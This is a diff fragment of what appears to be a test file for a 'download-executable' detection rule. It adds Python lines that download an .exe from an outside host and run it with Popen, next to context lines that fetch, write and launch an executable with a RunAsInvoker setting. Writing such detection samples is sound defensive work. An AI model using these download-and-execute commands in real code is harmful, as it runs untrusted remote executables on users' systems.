@@ -70,4 +70,6 @@ response = requests.get(URL)
 open(executable2, "wb").write(response.content)
 os.system(f'set __COMPACT_LAYER=RunAsInvoker | start +x {executable2}')
 
-
+# ruleid: download-executable
+urllib.request.urlretrieve("https://tryg.ga/normal.exe", "normal.exe")
+Popen(['normal.exe'])
